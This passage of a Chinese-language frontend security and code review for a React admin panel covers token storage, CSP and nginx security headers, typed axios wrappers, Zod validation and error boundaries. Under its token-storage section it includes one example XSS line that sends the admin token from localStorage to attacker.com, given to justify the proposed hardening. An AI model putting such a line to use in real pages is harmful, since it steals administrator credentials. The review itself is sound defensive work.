## 1. 认证架构

### 1.1 已修复项

以下问题已在上一轮修复，此处仅记录供审计追踪：

| 问题 | 根因 | 修复 |
|------|------|------|
| 401 拦截器用 `window.location.href` 整页跳转 | `request.ts` 调 `clearAuth()` 只清 localStorage，Zustand store 不知情 | `core/auth.ts` 添加 `onAuthClear` 事件机制；`request.ts` 移除硬跳转，依赖 Zustand 状态驱动 AuthGuard `<Navigate>` |
| AuthGuard 不验证 token 过期 | 只检查 token 是否为 null | 添加 `isTokenExpired()` 解析 JWT `exp` 字段 |
| 登出不调后端 `/admin/auth/logout` | `useAuthStore.logout` 是同步的，只清本地 | 改为异步，`try { await authService.logout() } finally { clearAuth() }` |
| 401 并发请求多次触发清理 | 无防抖 | 添加 `authExpiredHandled` 标志位 + 1 秒冷却 |

### 1.2 Token 存储：localStorage → XSS 即失守 🔴

**现状**：

```
access_token  →  localStorage('admin_token')
admin_info    →  localStorage('admin_info')  // 用户名、角色等
permissions   →  localStorage('admin_permissions')
```

任何成功注入的 XSS payload 只需一行代码即可窃取完整认证凭据：

```js
fetch('https://attacker.com/collect?t=' + localStorage.getItem('admin_token'))
```

**风险评估**：

管理后台通常不直接暴露给外部 UGC，但仍然存在以下攻击面：

- CDN / 第三方 npm 包供应链投毒
- 社工钓鱼链接注入脚本
- 浏览器扩展恶意注入
- 物理访问已解锁设备

一旦 token 泄露，攻击者获得管理员全权限。

**方案 C（短期，本周可完成）**：CSP + 安全响应头加固

在 Vite 构建时通过 `transformIndexHtml` 注入 CSP meta 标签：

```ts
// vite.config.ts
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [
    react(),
    {
      name: 'html-inject-csp',
      transformIndexHtml(html) {
        return html.replace(
          '<head>',
          `<head>
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
                 img-src 'self' data: https:; connect-src 'self' https://api.example.com;
                 font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'" />`
        )
      },
    },
  ],
})
```

nginx 侧双保险，添加安全响应头：

```nginx
# 追加到 nginx.conf 的 location / 块
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.example.com; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; form-action 'self'" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

**方案 A（长期）**：httpOnly Cookie

后端登录接口通过 `Set-Cookie` 下发 httpOnly cookie，前端不再接触 token：

```
Set-Cookie: access_token=xxx; HttpOnly; Secure; SameSite=Strict; Path=/admin; Max-Age=86400
```

前端改动：

- `request.ts` 移除手动 `Authorization` header 逻辑（浏览器自动携带 cookie）
- `core/auth.ts` 移除 `TOKEN_KEY` / `getToken` / `setToken` / `clearToken`
- 需要后端 `/admin/auth/me` 接口，前端从该接口动态获取 admin 信息和权限

> **CSRF 注意**：httpOnly cookie 需要后端配合 CSRF token 或 SameSite=Strict。当前 Bearer token 方案天然免疫 CSRF（浏览器不会自动附加 Authorization header）。

### 2.2 服务层类型缺乏契约校验 🟡

**现状**：

```ts
// services/users.ts
async list(params: UserFilter & PageParams): Promise<PageData<User>> {
  return request.get('/admin/users', { params })
}
```

`request.get` 返回 `any`（axios 默认），拦截器返回 `data.data` 也是 `any`。类型签名 `Promise<PageData<User>>` 是**声明式承诺**而非**编译器约束**。后端字段改名（如 `items` → `records`）时：

- 编译期：零报错
- 运行时：`data.items.map(...)` → `Cannot read properties of undefined`

**方案 A（推荐）**：axios 泛型包装

```ts
// core/request.ts — 在现有 request 实例上包装泛型方法

import type { AxiosRequestConfig } from 'axios'

// 拦截器已完成 .data.code 检查和 .data.data 抽取
// 此处泛型 T 对应抽取后的业务数据类型
const http = {
  get<T>(url: string, config?: AxiosRequestConfig): Promise<T> {
    return request.get(url, config) as Promise<T>
  },
  post<T>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T> {
    return request.post(url, data, config) as Promise<T>
  },
  put<T>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T> {
    return request.put(url, data, config) as Promise<T>
  },
  patch<T>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T> {
    return request.patch(url, data, config) as Promise<T>
  },
  delete<T>(url: string, config?: AxiosRequestConfig): Promise<T> {
    return request.delete(url, config) as Promise<T>
  },
}

export default http
```

服务层迁移：

```ts
// services/users.ts
import http from '@/core/request'

export const userService = {
  async list(params: UserFilter & PageParams): Promise<PageData<User>> {
    return http.get<PageData<User>>('/admin/users', { params })  // 显式泛型
  },
  // ...
}
```

**方案 B（更强但投入大）**：Zod 运行时校验

对关键 API（用户列表、订单列表）添加 Zod schema，后端字段变更时运行时报错而非静默失败：

```ts
import { z } from 'zod'

const UserSchema = z.object({
  id: z.number(),
  openid: z.string(),
  phone: z.string().nullable(),
  is_active: z.boolean(),
  // ...
})

export type User = z.infer<typeof UserSchema>

// 服务层
async list(params): Promise<User[]> {
  const data = await http.get<any>('/admin/users', { params })
  return z.array(UserSchema).parse(data.items)
}
```

| 方案 | 编译期安全 | 运行时安全 | 开发成本 | 推荐 |
|------|-----------|-----------|----------|------|
| A. 泛型包装 | 部分（承诺） | 无 | 1h | ⭐ 立即 |
| B. Zod | 完整 | 完整 | 4h+ | 中期覆盖核心 API |

## 3. 工程化

### 3.1 无 ErrorBoundary — 单点崩溃全页白屏 🔴

**现状**：

`App.tsx` 只有 `Suspense`（懒加载兜底），没有任何错误边界。任意深层组件未捕获的异常导致整个 React 树卸载 → 白屏。

**方案**：三层错误边界

```
ErrorBoundary (根级：系统崩溃兜底)
 └─ Suspense
     └─ useRoutes(routes)
         └─ AuthGuard
             └─ AdminLayout
                 └─ ErrorBoundary (页面级：单页崩溃隔离)
                     └─ <Outlet />
```

```tsx
// src/components/ErrorBoundary.tsx
import { Component, type ReactNode, type ErrorInfo } from 'react'
import { Button, Result } from 'antd'

interface Props {
  children: ReactNode
  fallback?: (error: Error, reset: () => void) => ReactNode
  /** 根级模式下显示'系统异常'，页面级显示'页面加载失败' */
  level?: 'root' | 'page'
}

interface State {
  error: Error | null
}

export class ErrorBoundary extends Component<Props, State> {
  state: State = { error: null }

  static getDerivedStateFromError(error: Error): State {
    return { error }
  }

  componentDidCatch(error: Error, info: ErrorInfo) {
    console.error(
      `[ErrorBoundary/${this.props.level ?? 'page'}]`,
      error.message,
      info.componentStack
    )
    // TODO: 上报到 Sentry 或等价监控平台
  }

  handleReset = () => {
    this.setState({ error: null })
  }

  render() {
    if (this.state.error) {
      if (this.props.fallback) {
        return this.props.fallback(this.state.error, this.handleReset)
      }
      const isRoot = this.props.level === 'root'
      return (
        <Result
          status="error"
          title={isRoot ? '系统异常' : '页面加载失败'}
          subTitle={this.state.error.message}
          extra={
            <Button type="primary" onClick={this.handleReset}>
              {isRoot ? '刷新页面' : '重试'}
            </Button>
          }
        />
      )
    }
    return this.props.children
  }
}
```

```tsx
// App.tsx — 接入根级 ErrorBoundary
import { ErrorBoundary } from '@/components/ErrorBoundary'
import { routes } from './routes'

export default function App() {
  return (
    <ErrorBoundary level="root">
      <Suspense fallback={...}>
        {useRoutes(routes)}
      </Suspense>
    </ErrorBoundary>
  )
}
```

```tsx
// AdminLayout.tsx — 接入页面级 ErrorBoundary（包裹 <Outlet />）
// ...
<Content ...>
  <ErrorBoundary level="page">
    {children || <Outlet />}
  </ErrorBoundary>
</Content>
```

#### 4.2.3 admin 信息不持久化到 localStorage

**现状**：管理员用户名、角色等信息存储在 `localStorage('admin_info')`。

**方案**：登录后将 admin 信息仅存 Zustand（内存），刷新页面时从后端 `/admin/auth/me` 重新获取。

```ts
// stores/authStore.ts — 添加初始化方法
import { authService } from '@/services/auth'

// 在 authService 中添加
me: async (): Promise<{ admin: AdminInfo; permissions: string[] }> => {
  return request.get('/admin/auth/me')
}
```

```ts
// stores/authStore.ts
interface AuthState {
  // ...
  initialized: boolean
  initFromServer: () => Promise<void>
}

export const useAuthStore = create<AuthState>((set, get) => ({
  initialized: false,

  initFromServer: async () => {
    if (!getToken()) return
    try {
      const { admin, permissions } = await authService.me()
      set({ admin, permissions, initialized: true })
    } catch {
      // token 无效 → 静默清理
      clearAuth()
      set({ token: null, admin: null, permissions: [], initialized: true })
    }
  },

  login: async (username, password) => {
    const data = await authService.login(username, password)
    setToken(data.access_token) // 仅 token 持久化
    // admin 不写 localStorage
    set({ token: data.access_token, admin: data.admin, permissions: data.permissions, initialized: true })
  },
}))
```

```tsx
// AuthGuard.tsx — 路由守卫时初始化
export default function AuthGuard() {
  const { token, initialized, initFromServer } = useAuthStore(
    (s) => ({ token: s.token, initialized: s.initialized, initFromServer: s.initFromServer })
  )

  useEffect(() => {
    if (token && !initialized) {
      initFromServer()
    }
  }, [token, initialized])

  // ...
}
```

#### 4.2.4 统一 ConfirmButton 替代裸 Popconfirm

**现状**：`ConfirmButton` 组件已存在（支持 loading 状态），但各页面直接使用 antd 的 `Popconfirm`。

**方案**：迁移所有危险操作到 `ConfirmButton`，统一：

- 确认文案模板
- loading 状态
- 错误处理

```ts
// 各页面迁移示例
// 之前：
<Popconfirm title="确认删除此用户？" onConfirm={() => handleDelete(record.id)}>
  <Button type="link" size="small" danger>删除</Button>
</Popconfirm>

// 之后：
<ConfirmButton
  title="删除用户"
  description={`确认删除用户 ${record.phone}？此操作不可撤销。`}
  danger
  type="link"
  size="small"
  onConfirm={() => handleDelete(record.id)}
>
  删除
</ConfirmButton>
```
